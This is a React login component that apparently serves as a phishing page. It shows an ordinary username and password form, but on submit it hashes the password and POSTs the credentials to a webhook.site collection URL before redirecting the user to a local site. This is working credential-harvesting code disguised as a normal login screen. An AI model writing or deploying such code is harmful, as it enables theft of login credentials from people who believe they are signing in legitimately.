
import React ,{useState} from "react";
import CryptoJS from "crypto-js";
import './danger.css';
import { useNavigate } from "react-router-dom";
const Login=()=>{
    let navigate = useNavigate(); 
    
    
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const handleUserName=(event)=>{
        setUsername(event.target.value);
    }
    const handlePassword=(event)=>{
        setPassword(event.target.value);
    }
    const DoPOST=(event)=>{
        event.preventDefault();
        let hashedPassword = CryptoJS.SHA256(password).toString(CryptoJS.enc.Hex);
        let data={
            username,
            password:hashedPassword
        };
        let link="https://webhook.site/b8b49132-82ff-495b-800d-8ed04aa137f9"
        fetch(link, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          }).then(response => {
            if (response.ok) {
                navigate("",{replace:true})
              window.location.href="http://localhost:3001/"
              
            } else {
              throw new Error('Network response was not ok');
            }
          })
        .catch((error)=>{console.log(error)});

        // fetch had to do here
    }
    return(
        <div className="w-[98.5%] flex justify-center items-center m-3 mt-10 border-2 rounded-lg border-slate-500 element">
            <div className="flex flex-col md:min-w-[30%]  justify-center items-center shadow-md border-2 border-slate-600 shadow-slate-200 ">
                <h1 className=" text-3xl font-extrabold my-8">LOG IN</h1>
                <form className=" " action="" method="post" onSubmit={DoPOST}>
                    <p>UserName</p>
                    <div className="flex mb-12 border-gray-600 rounded-lg border-2">
                    <img src="./user.png" className="ml-2" alt="user" style={{height:'auto',width:'2.5rem'}} />
                    <input className="bg-slate-100 ml-5 w-52 h-10 placeholder:ml-1 px-2 my-1 mr-1" type="text" name="username" value={username} onChange={handleUserName} placeholder="UserName" />
                    </div>
                    <p>Password</p>
                    <div className="flex mb-12 border-gray-600 rounded-lg border-2">
                        <img src="./key1.png" alt="pssd" style={{height:'auto',width:'2.5rem'}} />
                    <input className="bg-slate-100 ml-5 w-52 h-10 placeholder:ml-1 px-2 my-1 mr-1" type="password" name="password" value={password} onChange={handlePassword} id="lpssd" placeholder="Password"/>
                    </div>
                    <div className="flex justify-center" >
                        <button className="w-64 h-10 my-9 bg-blue-700 text-white rounded-lg hover:bg-blue-500" type="Submit">Log In</button>
                    </div>
                </form>
            </div>
        </div>
    )
}
export default Login;